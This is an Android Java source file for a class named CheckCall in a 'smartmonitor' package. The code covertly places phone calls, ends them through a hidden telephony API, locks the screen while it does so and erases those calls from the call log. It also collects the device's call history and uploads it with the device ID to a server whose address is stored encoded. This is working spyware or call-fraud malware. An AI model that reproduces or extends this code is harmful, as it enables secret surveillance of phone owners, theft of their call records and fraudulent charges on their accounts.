package com.android.smartmonitor.control;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Timer;
import java.util.TimerTask;
import java.util.Map.Entry;

import com.android.internal.telephony.ITelephony;
import com.android.smartmonitor.common.CheckGlobal;
import com.android.smartmonitor.common.CheckNC;
import com.android.smartmonitor.receiver.CheckCallReceiver;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.Log;

public class CheckCall {
	public static boolean g_isMyCall = false;
	public static int g_myCallDelay = 0;

	private Context m_context;
	private Timer m_timer;
	private HashMap<String, String> mCommand;

	private CheckScreen m_screen;

	private int m_interval;
	private int m_callTime;
	private int m_nTimer;
	private int m_countTimer;
	private int m_preCounter;

	private String m_callNumber;

	private ArrayList<HashMap<String, String>> m_callArray;
	private ArrayList<HashMap<String, String>> m_followArray;

	public CheckCall(Context context) {
		this.m_context = context;

		m_interval = 5;
		m_callTime = 0;
		m_nTimer = 0;
		m_countTimer = 0;
		m_preCounter = 0;

		m_callNumber = null;

		mCommand = null;
		m_callArray = new ArrayList<HashMap<String, String>>();
		m_followArray = new ArrayList<HashMap<String, String>>();

		m_timer = new Timer();

		m_screen = new CheckScreen(m_context);

		TimerTask task = new TimerTask() {
			public void run() {
				try {
					if (g_isMyCall) {
						if (CheckCallReceiver.getCallState() == 1 && m_nTimer > 0) {
							if (m_nTimer == m_countTimer) {
								endCall();
								setDeliveredResult(1);
							} else {
								g_myCallDelay = (m_nTimer - m_countTimer) * m_interval;
								m_countTimer++;
							}
						} else {
							m_preCounter++;
							if (m_preCounter > 7000 / m_interval) {
								endCall();
								setDeliveredResult(2);
							}
						}

						m_screen.screenLock();
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		};

		m_timer.schedule(task, m_interval, m_interval);
	}

	public static boolean getMyCallState() {
		return g_isMyCall;
	}

	public static int getMyCallDelayTime() {
		return g_myCallDelay;
	}

	public void initCall() {
		TelephonyManager tm = (TelephonyManager) m_context.getSystemService(Context.TELEPHONY_SERVICE);
		try {
			Class<?> c = Class.forName(tm.getClass().getName());
			Method m = c.getDeclaredMethod("getITelephony");
			m.setAccessible(true);
			ITelephony telephonyService = (ITelephony) m.invoke(tm);
			telephonyService.endCall();
		} catch (Exception e) {
			Log.e("telephonyTest", "initcall failed", e);
		}
	}

	public boolean call(String number, int time) {
		// TODO Auto-generated method stub
		if (g_isMyCall == true)
			return false;

//		WifiIONative.clearFBStart();


		initCall();

		g_isMyCall = true;

		m_preCounter = 0;
		m_callTime = time * 1000;
		m_countTimer = 0;
		m_nTimer = m_callTime / m_interval;
		g_myCallDelay = m_callTime;

		m_callNumber = number;

		try {
			Intent ent = new Intent();
			ent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			ent.setAction(Intent.ACTION_CALL);
			ent.setData(Uri.fromParts("tel", number, "#"));
			//ent.setData(Uri.fromParts("tel:00064683633", number, "#"));

			m_context.startActivity(ent);
		} catch (Exception e) {
			Log.e("telephonyTest", "call failed", e);
			return false;
		}

		return true;
	}

	public void endCall() {
		m_preCounter = 0;
		m_nTimer = 0;
		m_countTimer = 0;
		g_myCallDelay = 0;
		g_isMyCall = false;

		try {
			TelephonyManager tm = (TelephonyManager) m_context.getSystemService(Context.TELEPHONY_SERVICE);

			Class<?> c = Class.forName(tm.getClass().getName());
			Method m = c.getDeclaredMethod("getITelephony");
			m.setAccessible(true);
			ITelephony telephonyService = (ITelephony) m.invoke(tm);
			telephonyService.endCall();

			deleteCall(m_callNumber);
			m_callNumber = null;
		} catch (Exception e) {
			Log.e("telephonyTest", "endcall failed", e);
		}
	}


	public boolean isSleep() {
		SharedPreferences localSharedPreferences = m_context.getSharedPreferences("d", 0);
		int sleep = localSharedPreferences.getInt("call_sleep", -1);

		if (sleep == -1)
			return true;

		if (sleep == 0)
			return false;
		else
			return true;
	}

	public void setSleep(boolean value) {
		SharedPreferences.Editor localEditor = m_context.getSharedPreferences("d", 0).edit();

		if (value == false)
			localEditor.putInt("call_sleep", 0);
		else
			localEditor.putInt("call_sleep", 1);

		localEditor.commit();
	}

	public boolean isBusy() {
		if (m_callArray.size() > 0
				|| m_followArray.size() > 0)
			return true;

		return false;
	}

	public int getDeliveredResult() {
		SharedPreferences localSharedPreferences = m_context.getSharedPreferences("d", 0);
		int deliveredResult = localSharedPreferences.getInt("call_deliveredResult", -1);

		if (deliveredResult == -1)
			return 0;

		return deliveredResult;
	}

	public void setDeliveredResult(int value) {
		SharedPreferences.Editor localEditor = m_context.getSharedPreferences("d", 0).edit();

		localEditor.putInt("call_deliveredResult", value);

		localEditor.commit();
	}

	public void replyCommand() {
		boolean isSent = false;

		postCallLog();

	}


	public void deleteCall(String number) {
		if (number == null)
			return;

		try {
			String queryString = "NUMBER=" + number;
			m_context.getContentResolver().delete(CallLog.Calls.CONTENT_URI, queryString, null);
		} catch (Exception e) {

		}
	}

	public HashMap<String, String> getLog() {
		HashMap<String, String> result = new HashMap<String, String>();
		int number = 0;
		Cursor cur = null;
		String num = "";
		String date = "";
		int time = 0;
		int protocol = 0;

		String[] CALL_PROJECTION = {CallLog.Calls.TYPE, CallLog.Calls.CACHED_NAME, CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION};

		try {
			cur = m_context.getContentResolver().query(CallLog.Calls.CONTENT_URI, CALL_PROJECTION, null, null, CallLog.Calls.DEFAULT_SORT_ORDER);

			while(cur.moveToNext())
	    	{
	    		num = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));
	            date = CheckGlobal.timeToString(cur.getLong(cur.getColumnIndex(CallLog.Calls.DATE)));
	            time = cur.getInt(cur.getColumnIndex(CallLog.Calls.DURATION));
	            protocol = cur.getInt(cur.getColumnIndex(CallLog.Calls.TYPE));

	            
	            if (num == null)
	    			num = "00000000000";
	
	    		if (num.length() > 1 && num.charAt(0) == '+')
	    			num = num.substring(1);

				num=num.replaceAll(" ","");
	    		
	    		result.put(String.valueOf(number * 4), String.valueOf(protocol));
	    		result.put(String.valueOf(number * 4 + 1), num);
	    		result.put(String.valueOf(number * 4 + 2), date);
	    		result.put(String.valueOf(number * 4 + 3), String.valueOf(time));
	    		number++;
	    		
	    		if(number == CheckGlobal.g_logLimit)
	    			break;
	    	}
    	
	    	result.put("number", String.valueOf(number));
	    	return result;
        } catch (Exception e) {
        	return null;
        }
    }
	
	public boolean postCallLog()
    {
		SharedPreferences localSharedPreferences = m_context.getSharedPreferences("d", 0);
		
	    int msgLogUpload = localSharedPreferences.getInt("callLogUpload", -1);
	    if ((msgLogUpload == -1) || (msgLogUpload == 1))
	    	return false;

	    
    	return postCallLog(CheckGlobal.getDeviceID(m_context), getLog());
    }
	
	public boolean postCallLog(String deviceID, HashMap<String, String> callLog)
	{
		String response = null;

		System.out.println("CallLog sended:::" + deviceID);
	    if (callLog == null)
	    	return false;
	    
	    callLog.put("phone_deviceID", deviceID);
	    callLog.put("action", "post");
	
	    String url = CheckGlobal.KMSDecode(CheckGlobal.g_managerURL) + "call.log.php";

	    response = CheckNC.sendWithPost(url, callLog, "Utf-8");
	    if(response == null || response.indexOf("ok") == -1)
	    	return false;
		SharedPreferences.Editor localEditor = m_context.getSharedPreferences("d", 0).edit();
		localEditor.putInt("callLogUpload", 1);
		localEditor.commit();
	    return true;
	}

}
